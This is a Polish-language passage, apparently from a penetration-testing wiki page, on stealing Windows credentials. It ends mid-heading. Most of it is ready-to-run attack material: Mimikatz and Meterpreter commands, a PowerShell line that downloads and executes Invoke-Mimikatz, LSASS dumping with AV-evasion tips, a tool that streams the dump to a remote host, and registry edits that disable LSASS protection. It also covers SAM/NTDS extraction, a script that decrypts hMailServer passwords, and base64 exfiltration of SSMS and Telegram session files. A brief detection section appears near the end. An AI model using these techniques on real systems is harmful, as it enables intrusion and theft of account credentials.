# Wykradanie poświadczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Poświadczenia Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Dowiedz się, co jeszcze potrafi Mimikatz, na** [**tej stronie**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Dowiedz się tutaj więcej o możliwych zabezpieczeniach poświadczeń.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatzowi wyodrębnienie niektórych poświadczeń.**

## Poświadczenia w Meterpreterze

Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **który** stworzyłem, aby **wyszukiwać hasła i hashe** na komputerze ofiary.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Omijanie AV

### Procdump + Mimikatz

Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem firmy Microsoft**, Defender go nie wykrywa.\
Możesz użyć tego narzędzia, aby **zrzucić proces lsass**, **pobrać zrzut** i **lokalnie wyodrębnić** z niego **dane uwierzytelniające**.

Możesz też użyć [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

This proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre programy **AV** mogą **wykryć** jako **złośliwe** użycie **procdump.exe do zrzucenia lsass.exe**. Dzieje się tak, ponieważ **wykrywają** ciągi **„procdump.exe” i „lsass.exe”**. Dlatego **bardziej stealthowe** jest **przekazanie** jako **argumentu** **PID** procesu lsass.exe do procdump **zamiast** nazwy **lsass.exe.**

### Zrzucanie lsass za pomocą **comsvcs.dll**

Biblioteka DLL o nazwie **comsvcs.dll**, znajdująca się w `C:\Windows\System32`, odpowiada za **zrzucanie pamięci procesu** w przypadku awarii. Zawiera ona **funkcję** o nazwie **`MiniDumpW`**, którą można wywołać za pomocą `rundll32.exe`.\
Pierwsze dwa argumenty nie mają znaczenia, ale trzeci jest podzielony na trzy części. Pierwszą stanowi identyfikator procesu, którego pamięć ma zostać zrzucona, drugą — lokalizacja pliku zrzutu, a trzecią musi być słowo **full**. Nie ma innych dostępnych opcji.\
Po sparsowaniu tych trzech części biblioteka DLL tworzy plik zrzutu i zapisuje w nim pamięć wskazanego procesu.\
Można użyć **comsvcs.dll** do zrzucenia procesu lsass, dzięki czemu nie trzeba przesyłać ani uruchamiać procdump. Metoda ta została szczegółowo opisana na stronie [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Do uruchomienia służy następujące polecenie:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Możesz zautomatyzować ten proces za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzucanie lsass za pomocą Menedżera zadań**

1. Kliknij prawym przyciskiem myszy pasek zadań i kliknij Menedżer zadań
2. Kliknij Więcej szczegółów
3. Na karcie Procesy znajdź proces „Local Security Authority Process”
4. Kliknij proces „Local Security Authority Process” prawym przyciskiem myszy i kliknij „Utwórz plik zrzutu”.

### Zrzucanie lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to podpisany przez Microsoft plik binarny, będący częścią pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Istniejący zrzut awarii całego systemu lub jego skompresowana kopia w dostępnym folderze użytkownika mogą zawierać materiał uwierzytelniający do analizy offline. Nazwy plików, takie jak `MEMORY.DMP` i `MEMORY.7z`, są jedynie wskazówkami przy przeglądzie — zweryfikuj ich pochodzenie i dostępność, nie zakładaj, że zawierają użyteczne lub aktualne poświadczenia.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumpowanie lsass z użyciem PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do zrzucania procesów chronionych, które obsługuje obfuskację zrzutu pamięci i przesyłanie go na zdalne stacje robocze bez zapisywania go na dysku.

**Najważniejsze funkcje**:

1. Omijanie ochrony PPL
2. Obfuskacja plików zrzutu pamięci w celu uniknięcia wykrycia przez mechanizmy Defendera oparte na sygnaturach
3. Przesyłanie zrzutu pamięci metodami RAW i SMB bez zapisywania go na dysku (zrzut bezplikowy)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – zrzucanie LSASS oparte na SSP bez MiniDumpWriteDump

Ink Dragon dostarcza trzyetapowy dumper o nazwie **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, więc hooki EDR na tym API nigdy się nie uruchamiają:<sup>[[3]](#references)</sup>

1. **Loader Stage 1 (`lals.exe`)** – wyszukuje w `fdp.dll` placeholder składający się z 32 małych liter `d`, zastępuje go bezwzględną ścieżką do `rtu.txt`, zapisuje zmodyfikowaną bibliotekę DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. Wymusza to załadowanie przez **LSASS** złośliwej biblioteki DLL jako nowego Security Support Provider (SSP).
2. **Stage 2 w LSASS** – po załadowaniu `nfdp.dll` przez LSASS biblioteka odczytuje `rtu.txt`, wykonuje XOR każdego bajtu z `0x20` i mapuje zdekodowany blob do pamięci, a następnie przekazuje mu wykonanie.
3. **Stage 3 – dumper** – zmapowany payload odtwarza logikę MiniDump, używając **direct syscalls** rozwiązywanych na podstawie zahashowanych nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany eksport o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, zapisuje do pliku skompresowany zrzut LSASS, a następnie zamyka uchwyt, dzięki czemu eksfiltracja może nastąpić później.

Uwagi operatora:

* Trzymaj `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Stage 1 zastępuje zakodowany na stałe placeholder bezwzględną ścieżką do `rtu.txt`, więc rozdzielenie tych plików przerywa łańcuch.
* Rejestracja odbywa się przez dodanie `nfdp` do `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Możesz samodzielnie dodać tę wartość, aby LSASS ładował SSP ponownie przy każdym uruchomieniu systemu.
* Pliki `%TEMP%\*.ddt` to skompresowane zrzuty. Rozpakuj je lokalnie, a następnie użyj Mimikatz/Volatility do wyodrębnienia poświadczeń.
* Uruchomienie `lals.exe` wymaga uprawnień administratora/SeTcb, aby `AddSecurityPackageA` zakończyło się powodzeniem; po powrocie wywołania LSASS przejrzyście ładuje nieautoryzowany SSP i wykonuje Stage 2.
* Usunięcie biblioteki DLL z dysku nie usuwa jej z LSASS. Usuń wpis rejestru i uruchom ponownie LSASS (restart systemu) albo pozostaw go, aby utrzymać długotrwałą persystencję.

## CrackMapExec

### Zrzucanie hashy SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump sekretów LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Zrzucenie pliku NTDS.dit z docelowego kontrolera domeny

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Zrzucanie historii haseł z NTDS.dit na docelowym DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Pokaż atrybut pwdLastSet dla każdego konta w NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Wykradanie SAM i SYSTEM

Pliki te powinny być **zlokalizowane** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Nie można ich jednak **po prostu skopiować w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najłatwiej wykraść te pliki, uzyskując ich kopię z rejestru:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashe** za pomocą:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Kopia woluminu w tle

Za pomocą tej usługi możesz kopiować chronione pliki. Wymagane są uprawnienia administratora.

#### Using vssadmin

Plik binarny vssadmin jest dostępny tylko w wersjach systemu Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ale możesz zrobić to samo z poziomu **Powershell**. Oto przykład **kopiowania pliku SAM** (używany dysk to „C:”, a plik jest zapisywany w C:\users\Public), ale możesz użyć tej metody do kopiowania dowolnego chronionego pliku:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na koniec możesz też użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby wykonać kopię plików SAM, SYSTEM i ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Poświadczenia Active Directory - NTDS.dit**

Plik **NTDS.dit** jest znany jako serce **Active Directory** i zawiera kluczowe dane o obiektach użytkowników, grupach i ich członkostwie. Przechowywane są w nim **hashe haseł** użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w lokalizacji **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych znajdują się trzy główne tabele:

- **Tabela danych**: przechowuje szczegóły dotyczące obiektów, takich jak użytkownicy i grupy.
- **Tabela łączy**: śledzi relacje, takie jak członkostwo w grupach.
- **Tabela SD**: przechowuje **deskryptory zabezpieczeń** każdego obiektu, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

Badania Christoffera Anderssona dotyczące warstwy bazy danych opisują te tabele i ich zachowanie zależne od wersji bardziej szczegółowo.<sup>[[8]](#references)</sup>

Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a korzysta z niego _lsass.exe_. Następnie **część** pliku **NTDS.dit** może znajdować się **w pamięci procesu `lsass`** (prawdopodobnie można znaleźć tam ostatnio używane dane dzięki poprawie wydajności przez zastosowanie **cache**).

#### Odszyfrowywanie hashy w pliku NTDS.dit

Hash jest szyfrowany trzykrotnie:

1. Odszyfruj klucz szyfrowania haseł (**PEK**) za pomocą **BOOTKEY** i **RC4**.
2. Odszyfruj **hash** za pomocą **PEK** i **RC4**.
3. Odszyfruj **hash** za pomocą **DES**.

**PEK** ma **taką samą wartość na każdym kontrolerze domeny**, ale jest **zaszyfrowany** w pliku **NTDS.dit** za pomocą właściwego dla danego kontrolera domeny **BOOTKEY** z jego gałęzi **SYSTEM**. Dlatego wyodrębnienie poświadczeń wymaga zarówno pliku **NTDS.dit**, jak i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kopiowanie pliku NTDS.dit za pomocą Ntdsutil

Dostępne od Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Możesz też użyć metody [**volume shadow copy**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że potrzebna będzie również kopia pliku **SYSTEM** (ponownie: użyj metody [**zrzucenia go z rejestru lub volume shadow copy**](#stealing-sam-and-system)).

### **Wyodrębnianie hashy z NTDS.dit**

Po **uzyskaniu** plików **NTDS.dit** i **SYSTEM** możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashe**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Możesz również **wyodrębnić je automatycznie** przy użyciu prawidłowego użytkownika z uprawnieniami administratora domeny:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

W przypadku **dużych plików NTDS.dit** zaleca się ich wyodrębnianie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Możesz też użyć **modułu metasploit**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale także całe obiekty i ich atrybuty, co pozwala na dalsze wydobywanie informacji, gdy surowy plik NTDS.dit został już pobrany.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Gałąź `SYSTEM` jest opcjonalna, ale umożliwia odszyfrowanie sekretów (hashy NT i LM, poświadczeń uzupełniających, takich jak hasła w postaci jawnego tekstu, klucze Kerberos lub klucze zaufania, a także historii haseł NT i LM). Oprócz innych informacji wyodrębniane są: konta użytkowników i komputerów wraz z ich hashami, flagi UAC, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwo rekurencyjne, drzewo jednostek organizacyjnych i członkostwo w nich, zaufane domeny wraz z typem, kierunkiem i atrybutami relacji zaufania...

## Lazagne

Pobierz plik binarny [stąd](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku binarnego do wyodrębniania poświadczeń z różnych programów.

```
lazagne.exe all
```

## Inne narzędzia do wyodrębniania poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

Tego narzędzia można użyć do wyodrębniania poświadczeń z pamięci. Pobierz je ze strony: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyodrębnianie poświadczeń z pliku SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Wyodrębnij dane uwierzytelniające z pliku SAM.

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Pobierz go z:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **uruchom**, a hasła zostaną wyodrębnione.

## Zbieranie danych z bezczynnych sesji RDP i osłabianie mechanizmów bezpieczeństwa

FinalDraft RAT grupy Ink Dragon zawiera tasker `DumpRDPHistory`, którego techniki przydadzą się każdemu red-teamerowi:<sup>[[3]](#references)</sup>

### Zbieranie telemetrii w stylu DumpRDPHistory

* **Docelowe serwery RDP** – przeanalizuj każdy hive użytkownika pod adresem `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint` oraz znacznik czasu ostatniej modyfikacji. Możesz odtworzyć logikę FinalDraft za pomocą PowerShella:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ślady przychodzących połączeń RDP** – przeszukaj dziennik `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pod kątem identyfikatorów zdarzeń **21** (pomyślne logowanie) i **25** (rozłączenie), aby ustalić, kto administrował tym komputerem:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Gdy już ustalisz, który Domain Admin regularnie się łączy, zrzutuj LSASS (za pomocą LalsDumper/Mimikatz), póki jego **rozłączona** sesja nadal istnieje. Fallback CredSSP + NTLM pozostawia jego verifier i tokeny w LSASS, które można następnie odtworzyć przez SMB/WinRM, aby przechwycić `NTDS.dit` lub ustanowić trwały dostęp na kontrolerach domeny.

### Obniżanie zabezpieczeń rejestru wykorzystywane przez FinalDraft

Ten sam implant modyfikuje również kilka kluczy rejestru, aby ułatwić kradzież poświadczeń:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Ustawienie `DisableRestrictedAdmin=1` wymusza pełne ponowne użycie poświadczeń/biletów podczas RDP, umożliwiając pivoty w stylu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` wyłącza filtrowanie tokenów UAC, dzięki czemu lokalni administratorzy otrzymują nieograniczone tokeny przez sieć.
* `DSRMAdminLogonBehavior=2` pozwala administratorowi DSRM logować się, gdy kontroler domeny (DC) jest online, dając atakującym kolejne wbudowane konto z wysokimi uprawnieniami.
* `RunAsPPL=0` usuwa ochronę LSASS PPL, ułatwiając zrzucanie pamięci narzędziom takim jak LalsDumper.

## Dane uwierzytelniające w konfiguracji hMailServer (po przejęciu)

Sprawdź dokładne pliki konfiguracji `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` i `C:\ProgramData\hMailServer\hMailServer.ini`, zależnie od układu instalacji. Czytelna, niepusta wartość `[Security] AdministratorPassword=` to hash hasła administratora hMailServer; nie stanowi dowodu na hasło administratora Windows. Jeśli to poświadczenie zostanie odzyskane, każdy pivot na konto Windows wymaga niezależnego potwierdzenia ponownego użycia hasła oraz uprawnień logowania.

W instalacjach korzystających z bazy SQL CE osobna wartość `[Database] Password=` w pliku INI chroni bazę danych. W starszych instalacjach ta wartość jest szyfrowana algorytmem Blowfish przy użyciu statycznego klucza `THIS_KEY_IS_NOT_SECRET` i zamiany kolejności bajtów w 4-bajtowych słowach. Użyj ciągu szesnastkowego z pliku INI w tym fragmencie kodu Python:<sup>[[2]](#references)</sup>

Najpierw potwierdź, że bieżące konto może odczytać **zarówno** plik INI, jak i odpowiadającą mu bazę danych SQL CE `.sdf`. Hasło z pliku INI chroni bazę danych; jest oddzielne od hashy kont skrzynek pocztowych przechowywanych w bazie. Sprawdzaj lub aktualizuj **kopię** używanej bazy danych — nigdy aktywny plik.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Mając hasło w postaci jawnego tekstu, skopiuj bazę danych SQL CE, aby uniknąć blokad pliku, załaduj 32-bitowego dostawcę i w razie potrzeby zaktualizuj bazę przed wykonaniem zapytania o hashe:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Kolumna `accountpassword` używa formatu hasha hMailServer (tryb hashcat `1421`). Złamane hasło do skrzynki pocztowej pozwala przejść do konta użytkownika Windows tylko wtedy, gdy hasło jest używane ponownie przez konto lokalne lub domenowe, a konto to ma wymagane uprawnienia do zdalnego logowania.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Niektóre narzędzia przechwytują **hasła logowania w postaci plaintext** przez przechwycenie callbacku logowania LSA `LsaApLogonUserEx2`. Pomysł polega na hookowaniu lub opakowaniu callbacku pakietu uwierzytelniania, aby przechwycić poświadczenia **podczas logowania** (przed hashowaniem), a następnie zapisać je na dysku lub zwrócić operatorowi. Zwykle implementuje się to jako narzędzie pomocnicze, które wstrzykuje się do LSA lub rejestruje w nim, a następnie zapisuje każde udane interaktywne lub sieciowe zdarzenie logowania wraz z nazwą użytkownika, domeną i hasłem.<sup>[[1]](#references)</sup>

Uwagi operacyjne:
- Do załadowania narzędzia pomocniczego w ścieżce uwierzytelniania wymagane są uprawnienia lokalnego administratora lub SYSTEM.
- Przechwycone poświadczenia pojawiają się tylko wtedy, gdy nastąpi logowanie (interaktywne, RDP, usługi lub sieciowe — zależnie od hooka).

## Zapisane poświadczenia połączeń SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) przechowuje zapisane informacje o połączeniach w pliku `sqlstudio.bin` przypisanym do użytkownika. Dedykowane narzędzia do zrzutu danych mogą analizować ten plik i odzyskiwać zapisane poświadczenia SQL. W powłokach, które zwracają tylko wynik polecenia, plik jest często eksfiltrowany przez zakodowanie go jako Base64 i wypisanie na stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Po stronie operatora odbuduj plik i uruchom lokalnie dumper, aby odzyskać dane uwierzytelniające:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Kradzież sesji przeglądarki i plików cookie za pomocą Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Kradzież sesji `tdata` w Telegram Desktop

Telegram Desktop przechowuje dane autoryzacyjne i stan konta w katalogu **`tdata`**. Skopiowaną sesję można wczytać za pomocą kompatybilnych narzędzi, aby uwierzytelnić się bez hasła do konta, dopóki autoryzacja pozostaje ważna; jeśli włączono szyfrowanie danych lokalnych, osoba wykradająca dane potrzebuje również kodu dostępu. Uwierzytelniona sesja może następnie ujawnić dane tożsamości, metadane czatów i członkostwa, wiadomości oraz pliki multimedialne do pobrania.<sup>[[10]](#references)</sup>

### Wykrywanie i pozyskiwanie

Przeszukaj zarówno zainstalowane, jak i przenośne układy katalogów; nazwy pakietów Microsoft Store są różne, dlatego wylicz katalogi pakietów zawierające `TelegramMessenge` i sprawdź ich podkatalog `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Jeśli zwykłe odczyty się nie powiodą, a token procesu **już zawiera i ma włączony** `SeBackupPrivilege`, dostęp uwzględniający kopię zapasową stanowi rozwiązanie awaryjne; nie uzyskuje tego uprawnienia ani nie podnosi uprawnień procesu. `CreateFileW` z `FILE_FLAG_BACKUP_SEMANTICS` może zażądać semantyki kopii zapasowej/przywracania i pominąć kontrole zabezpieczeń plików, jeśli token zawiera wymagane uprawnienia, ale sama flaga nie omija niezgodnej blokady współdzielenia.<sup>[[10]](#references)[[11]](#references)</sup>

W przypadku zablokowanych plików używanych na bieżąco utwórz/odczytaj **Volume Shadow Copy**; w przypadku plików zablokowanych przez ACL `robocopy /B` używa trybu kopii zapasowej i omija ACL plików oraz katalogów.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant uwzględniający ograniczoną przepustowość może najpierw przesłać wyłącznie inwentarz ścieżek plików, otrzymać identyfikator migawki wraz ze ścieżkami już zapisanymi przez C2, a następnie przesłać tylko brakujące pliki. Dlatego niewielkie transfery przyrostowe po rekurencyjnym wyliczeniu `tdata` nadal mogą oznaczać udaną kradzież sesji.<sup>[[10]](#references)</sup>

### Wykrywanie i powstrzymywanie

Skoreluj rekurencyjny dostęp do `tdata` przez proces inny niż Telegram z włączeniem `SeBackupPrivilege`, otwieraniem plików z użyciem semantyki kopii zapasowej, aktywnością VSS lub procesem potomnym `robocopy.exe` używającym `/B`. Szukaj też szybkiego wyliczania zawartości zarówno `%APPDATA%`, jak i `%LOCALAPPDATA%\Packages`, po którym następują połączenia wychodzące z tego samego procesu. Po przejęciu konta użyj **Ustawienia → Urządzenia** (lub **Prywatność i bezpieczeństwo → Aktywne sesje**), aby zakończyć nierozpoznane sesje; samo włączenie weryfikacji dwuetapowej nie unieważnia skradzionej już autoryzacji.<sup>[[10]](#references)[[13]](#references)</sup>

## Kradzież danych uwierzytelniających passkeys / WebAuthn z Chrome w systemie Windows

Jeśli uda się uzyskać możliwość wykonywania kodu jako **użytkownik będący ofiarą** na hoście z systemem Windows, który używa **Chrome + Google Password Manager z synchronizowanymi passkeys**, passkeys stają się interesującym celem po eksploatacji, nawet **bez uprawnień administratora/SYSTEM**.<sup>[[4]](#references)</sup>

### Interesujące lokalne artefakty

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** przechowuje zakodowane w protobuf rekordy **`WebauthnCredentialSpecifics`**. Proces działający jako ten sam użytkownik może wyliczyć **RP ID**, **username**, **credential ID** oraz zaszyfrowane dane klucza prywatnego zsynchronizowanych passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** przechowuje lokalny stan rejestracji urządzenia, taki jak **`wrapped_identity_private_key`** oraz opakowany sekret używany do odzyskiwania zsynchronizowanych credentials.<sup>[[4]](#references)</sup>

Szybka analiza wstępna:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Obiektów blob kluczy powiązanych z TPM nadal można nadużyć jako lokalnej wyroczni podpisywania

